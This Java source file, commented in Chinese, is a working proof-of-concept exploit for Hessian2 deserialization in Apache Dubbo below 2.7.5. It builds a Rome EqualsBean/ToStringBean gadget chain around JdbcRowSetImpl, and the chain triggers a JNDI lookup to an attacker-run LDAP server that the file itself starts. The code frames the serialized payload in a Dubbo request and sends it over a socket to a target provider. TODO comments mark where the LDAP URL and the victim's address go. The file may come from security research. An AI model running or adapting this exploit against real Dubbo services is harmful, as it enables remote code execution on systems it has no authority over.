/*
 * [业务问题]: Apache Dubbo Hessian2 反序列化漏洞利用 (Rome 链)。
 * [实现逻辑]: 利用 Rome 库中的 EqualsBean/ToStringBean 结合 JdbcRowSetImpl 构造利用链，触发 JNDI 注入实现 RCE。
 */
package com.security.bug.dubbo;

import com.caucho.hessian.io.Hessian2Output;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import com.security.bug.common.server.LdapServer;
import com.security.bug.common.utils.Reflections;
import com.security.bug.dubbo.support.NoWriteReplaceSerializerFactory;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;

/**
 * dubbo 默认配置，即 hessian2 反序列化漏洞验证。
 * 适用版本: Dubbo < 2.7.5
 */
public class RomePoc {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws Exception {
    JdbcRowSetImpl rs = new JdbcRowSetImpl();
    //todo 此处填写ldap url
    rs.setDataSourceName("ldap://127.0.0.1:43658/Calc");
    rs.setMatchColumn("foo");
    Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);

    ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
    EqualsBean root = new EqualsBean(ToStringBean.class, item);

    HashMap s = new HashMap<>();
    Reflections.setFieldValue(s, "size", 2);
    Class<?> nodeC;
    try {
      nodeC = Class.forName("java.util.HashMap$Node");
    }
    catch ( ClassNotFoundException e ) {
      nodeC = Class.forName("java.util.HashMap$Entry");
    }
    Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
    nodeCons.setAccessible(true);

    Object tbl = Array.newInstance(nodeC, 2);
    Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
    Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));
    Reflections.setFieldValue(s, "table", tbl);

    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

    // header.
    byte[] header = new byte[16];
    // set magic number.
    Bytes.short2bytes((short) 0xdabb, header);
    // set request and serialization flag.
    header[2] = (byte) ((byte) 0x80 | 0x20 | 2);

    // set request id.
    Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

    ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
    Hessian2Output out = new Hessian2Output(hessian2ByteArrayOutputStream);
    NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
    sf.setAllowNonSerializable(true);
    out.setSerializerFactory(sf);

    out.writeObject(s);

    out.flushBuffer();
    if (out instanceof Cleanable) {
      ((Cleanable) out).cleanup();
    }

    Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
    byteArrayOutputStream.write(header);
    byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

    byte[] bytes = byteArrayOutputStream.toByteArray();

    //todo 此处填写被攻击的dubbo服务提供者地址和端口
    Socket socket = new Socket("127.0.0.1", 20880);
    OutputStream outputStream = socket.getOutputStream();
    outputStream.write(bytes);
    outputStream.flush();
    outputStream.close();
  }
}
